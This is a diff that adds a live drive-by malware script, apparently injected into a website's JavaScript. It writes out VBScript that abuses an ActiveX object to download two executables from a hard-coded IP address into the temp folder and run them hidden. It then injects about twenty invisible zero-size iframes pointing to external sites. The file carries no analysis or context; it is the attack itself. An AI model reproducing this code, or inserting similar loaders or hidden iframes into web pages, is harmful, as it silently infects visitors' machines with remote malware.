@@ -1,0 +1,50 @@
+document.write('<script language="VBScript">');
+    document.write(':on error resume next');
+ document.write(':sub autoexe(dl,fname1) ');
+ 
+ document.write(':  Set df = document.createElement("object")');
+ document.write(' :  df.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"'); 
+  document.write(':     set SS = df.createobject("Adodb.Stream","")');
+ document.write('  : SS.type = 1');
+document.write(':set F = df.createobject("Scripting.FileSystemObject","")');
+ document.write('  :  set tmp = F.GetSpecialFolder(2)');
+ document.write(' : fname1= F.BuildPath(tmp,fname1)');
+ document.write(' :  SS.open');
+     document.write('  :    Set getexe = df.CreateObject("Microsoft."&"XMLHTTP","")');
+document.write(':getexe.Open "GET", dl, False');
+ document.write(' :  getexe.Send');
+ document.write('  : SS.write getexe.responseBody');
+  document.write(' : SS.savetofile fname1,2');
+document.write(' :   SS.close');
+document.write(':set Q = df.createobject("Shell.Application","")');
+document.write(':Q.ShellExecute fname1,"","","open",0');
+document.write(':end sub');
+document.write(':call autoexe("http://203.171.236.215/downloader.exe","downloader.exe")');
+document.write(':call autoexe("http://203.171.236.215/theopen.exe","theopen.exe")');
+  document.write('  </script>');
+
+
+
+
+document.write('<iframe src="http://www.iking.cn/sf999.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://ip.8dunet.com/nami142.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://ip.adanywhere.cn/wikiindex.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://ma.new9991.com/360/1022.htm" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://julong.ip8868.cn/hkjulong.asp" width="0" height="0" frameborder="0"></iframe>');
+
+document.write('<iframe src="http://www1.winopen.cn/uuben3.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://ip.alexaanywhere.com/eorrgovod.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://www1.winopen.cn/800uc.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://ip.8dunet.com/goal98net.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://59.34.197.239/show1.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://59.34.197.239/0013exe.htm" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://go1.ipcenter.cn/11v11.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://www2.winopen.cn/winopen1111.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://ip1.adanywhere.cn/kuaiso001.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://ip.adanywhere.cn/58hu03.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://go1.bannerbox.cn/dasuanbai.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://go.ipcenter.cn/15641651.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://www1.winopen.cn/vgongshe.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://ip.adanywhere.cn/open1.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://www.baibaoxiang.cn/yikuo.asp" width="0" height="0" frameborder="0"></iframe>');
+document.write('<iframe src="http://tugood.ip8868.cn/tugood.asp" width="0" height="0" frameborder="0"></iframe>');
